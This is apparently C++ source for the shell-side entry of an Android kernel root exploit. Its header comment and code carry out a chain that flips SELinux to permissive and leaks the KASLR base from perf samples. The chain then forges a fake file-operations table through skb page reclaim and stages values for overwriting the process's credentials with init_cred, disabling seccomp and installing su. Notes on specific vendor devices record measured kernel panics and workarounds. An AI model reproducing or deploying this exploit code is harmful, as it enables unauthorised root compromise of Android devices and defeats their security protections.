//
// shell_main.cpp — standalone adb-shell entry (the Payload's proven
// execution context). The app context cannot sustain the page engine's
// process/thread footprint (Android pids limits killed every clone child,
// measured live), so the whole flow runs here as a shell binary:
//
//   [optional stage1] SELinux flip only if /proc/<pid>/mem opens EACCES
//   stage0           KernelSnitch + skb reclaim -> fake page
//   ONE fire         miscdevice.fops -> fake_fops (P0-alias target)
//   R/W              /dev/ashmem + configfs forged buffer
//   KASLR leak       from the original ashmem_fops table
//   task walk        init_task.tasks chain until pid == getpid()
//   patch            cred/real_cred = init_cred, seccomp mode 0
//   root             install su + start daemon
//
#include <fcntl.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <signal.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sched.h>

#include "aliases.h"
#include "futex_probe.h"
#include "page_engine.h"
#include "root_stage.h"
#include "leak_probe.h"

void gl_post_root(void *);   // root_stage.cpp export
int gl_probe_setcon(void);   // root_stage.cpp export

static int g_status_fd_shell = -1;

static const char *env_path(const char *name, const char *fallback) {
    const char *value = getenv(name);
    return value && value[0] ? value : fallback;
}

static void sstatus(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) return;
    printf("%s\n", buf);
    fflush(stdout);
    if (g_status_fd_shell >= 0)
        (void)! write(g_status_fd_shell, buf, (size_t) n),
        (void)! write(g_status_fd_shell, "\n", 1);
}

static bool selinux_enforcing(void) {
    char b[8] = {0};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    /* The untrusted-app domain cannot read this node while SELinux is
     * enforcing.  Treat EACCES as enforcing, not permissive.  Once stage1a
     * lands, permissive policy allows the same process to read back '0'. */
    if (fd < 0) return true;
    (void)! read(fd, b, sizeof(b) - 1);
    close(fd);
    return b[0] == '1';
}

static void park_stage(const char *why) {
    sstatus("%s; process parked to keep PI state alive", why);
    for (;;) pause();
}

static void do_stage1a_only(void) {
    GlRoundCfg c1{};
    c1.trace_fd = -1; c1.trace_fd2 = g_status_fd_shell;
    c1.target = AL_SELINUX_STATE;
    c1.value = AL_SELINUX_VALUE;
    c1.lock_addr = AL_ZERO_LOCK + 16 * ZERO_LOCK_STRIDE;
    GlRoundOut o1 = gl_round(c1);
    bool permissive = !selinux_enforcing();
    sstatus("stage1a bug=%d observed=%d permissive=%d", (int) o1.bug_path,
            (int) o1.observed, (int) permissive);
    park_stage(permissive ? "STAGE1A_OK" : "STAGE1A_FAILED");
}

static void do_stage1b_only(void) {
    GlRoundCfg c1b{};
    c1b.trace_fd = -1; c1b.trace_fd2 = g_status_fd_shell;
    c1b.target = AL_SELINIT_STATE;
    c1b.value = AL_SELINIT_VALUE;
    c1b.lock_addr = AL_ZERO_LOCK + 32 * ZERO_LOCK_STRIDE;
    GlRoundOut o1b = gl_round(c1b);
    int e = gl_probe_setcon();
    sstatus("stage1b bug=%d observed=%d setcon=%d", (int) o1b.bug_path,
            (int) o1b.observed, e);
    park_stage(e == 0 ? "STAGE1B_OK" : "STAGE1B_FAILED");
}

int glshell_entry(void) {
    signal(SIGPIPE, SIG_IGN);
    setvbuf(stdout, nullptr, _IONBF, 0);
    setvbuf(stderr, nullptr, _IONBF, 0);
    struct rlimit r;
    if (getrlimit(RLIMIT_NOFILE, &r) == 0 && r.rlim_cur < r.rlim_max) {
        r.rlim_cur = r.rlim_max;
        setrlimit(RLIMIT_NOFILE, &r);
    }
    if (getrlimit(RLIMIT_NPROC, &r) == 0 && r.rlim_cur < r.rlim_max) {
        r.rlim_cur = r.rlim_max;
        setrlimit(RLIMIT_NPROC, &r);
    }
    // signals off before any canvas thread exists
    sigset_t all;
    sigfillset(&all);
    sigdelset(&all, SIGKILL);
    sigdelset(&all, SIGSTOP);
    pthread_sigmask(SIG_SETMASK, &all, nullptr);

    int sfd = open(env_path("GL_STATUS_PATH",
                            "/data/local/tmp/gl_shell_status.txt"),
                   O_WRONLY | O_CREAT | O_APPEND | O_SYNC | O_CLOEXEC, 0666);
    if (sfd >= 0) {
        g_status_fd_shell = fcntl(sfd, F_DUPFD, 2000);
        close(sfd);
    }

    sstatus("=== glshell start pid=%d uid=%d ===", (int) getpid(), getuid());
    /* O_SYNC fire trace: survives panics, tells FIRE-without-RSLT (died
     * inside the walk) from FIRE+RSLT (walk done, panic came later --
     * which would mean the WRITE landed and the next /dev/ashmem open
     * jumped into the fake table). */
    /* fire trace goes INTO the status file: OPLUS's post-crash cleanup
     * deletes freshly-created /data/local/tmp files (gl_trace.txt vanished
     * after every panic) but gl_shell_status.txt survives reliably */
    if (g_status_fd_shell >= 0) {
        extern void gl_set_trace_fd2(int);
        gl_set_trace_fd2(g_status_fd_shell);
    }

    /* stage1: perf_event_open is blocked for the shell domain too
     * (measured: 0 samples); 1a flips SELinux permissive which opens it,
     * and 1b repairs `initialized` so the framework survives. */
    if (getenv("GL_STAGE1A_ONLY")) {
        if (!selinux_enforcing())
            park_stage("STAGE1A_ALREADY_PERMISSIVE");
        do_stage1a_only();
    }
    if (getenv("GL_REPAIR_ONLY")) {
        if (selinux_enforcing()) {
            sstatus("FATAL: repair requested while SELinux is enforcing");
            return 1;
        }
        do_stage1b_only();
    }
    if (selinux_enforcing()) do_stage1a_only();
    sstatus("stage1 skipped: already permissive and repaired by prior process");
    if (!perf_open_works()) {
        sstatus("FATAL: perf still blocked after stage1");
        return 1;
    }

    /* KASLR BEFORE the fire: misc_open calls f_op->open the instant the
     * swapped table is installed, so the fake table must already carry
     * slid text pointers (the Payload always knows KASLR before firing).
     * The perf leak samples kernel PCs along the spinner path; the true
     * 2MB-aligned slide wins the vote. */
    uint64_t kaslr = 0;
    {
        struct timespec ts;
        (void) clock_gettime(CLOCK_MONOTONIC, &ts);
        struct spinner_ctx { std::atomic<int> tid; } sctx{{0}};
        pthread_t spin;
        pthread_create(&spin, nullptr, [](void *arg) -> void * {
            auto *c = (spinner_ctx *) arg;
            cpu_set_t set; CPU_ZERO(&set); CPU_SET(7, &set);
            sched_setaffinity(0, sizeof(set), &set);
            c->tid.store((int) syscall(SYS_gettid));
            for (;;) syscall(SYS_sched_yield);
            return nullptr;
        }, &sctx);
        while (!sctx.tid.load()) usleep(1000);
        LeakResult lr = leak_from_tid(sctx.tid.load());
        kaslr = lr.kaslr_base;
        sstatus("perf leak: samples=%lu kaslr=%016llx", lr.samples,
                (unsigned long long) kaslr);
        /* spinner left running: the process parks forever at the end */
    }
    if (!kaslr) {
        sstatus("FATAL: no KASLR from perf PCs");
        return 1;
    }
    pe::set_kaslr_base(kaslr);

    /* ONE page prep, exactly like Payload main.c: the route refreshes the
     * page per page-attempt itself (fops.c structure, 12 pages). The old
     * second prep here was a deviation: two independent leaks in one run
     * (page ready != page ok) littered an extra freed slab and doubled
     * the leak-dice. */
    if (!pe::prepare_page()) {
        sstatus("FATAL: initial page prep failed");
        return 1;
    }
    sstatus("page ok fops=%016llx", (unsigned long long) pe::get_fake_fops());
    /* Hybrid handoff: the engine's own fires never landed the canvas (the
     * engine-context dead frame drifts: x26 low bits differed 0x424 vs
     * 0xea4 across boots; a task=NULL probe fire still panicked, so the
     * walk read stale bytes, not our paint). The APP-context canvas is the
     * geometry that lands (SELinux rounds 100%, fake-page rounds faulted
     * exactly at the painted fake_lock). So: hand the four words to the
     * app and park -- staying alive holds the reclaim socket (and with it
     * the skb pages backing the fake 32KB slab). */
    /* Hand the fire stage to the app. */
    {
        /* Boot freshness stamp: the first 16 hex chars of boot_id are a
         * unique 64-bit boot identity. Without it a values file left by a
         * previous boot makes the app fire at a stale (foreign or unmapped)
         * fake page -- measured: instant kernel panic. */
        uint64_t boot_tag = 0;
        {
            char b[64] = {0};
            int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
            if (fd >= 0) { (void)! read(fd, b, sizeof(b) - 1); close(fd); }
            boot_tag = strtoull(b, nullptr, 16);
        }
        char line[256];
        snprintf(line, sizeof(line),
                 "boot=%016llx kaslr=%016llx fops=%016llx misc=%016llx "
                 "task=%016llx lock=%016llx\nREADY\n",
                 (unsigned long long) boot_tag,
                 (unsigned long long) kaslr,
                 (unsigned long long) pe::get_fake_fops(),
                 (unsigned long long) pe::get_misc_fops_alias(),
                  /* PLF110 empirically landed misc.fops with the P0 init_task
                   * alias (vendor PI/boost walk differs from Pixel). */
                  (unsigned long long) AL_INIT_TASK,
                 (unsigned long long) pe::get_fake_lock());
        const char *vp = env_path("GL_VALUES_PATH",
                                  "/data/local/tmp/gl_page_values.txt");
        int vfd = open(vp, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0666);
        if (vfd < 0) {
            sstatus("FATAL: values file open failed");
            return 1;
        }
        (void)! write(vfd, line, strlen(line));
        fsync(vfd);
        close(vfd);
        sstatus("VALUES READY base=%016llx (relaunch the app to fire)",
                (unsigned long long) (pe::get_fake_fops() - 0x1000));
    }
    /* Park: holds the reclaim socket (and the fake slab's skb pages). */
    sstatus("=== engine parked; app owns the fire ===");
    for (;;) pause();
    return 0;
}

#ifndef GL_EMBEDDED
int main(void) { return glshell_entry(); }
#endif
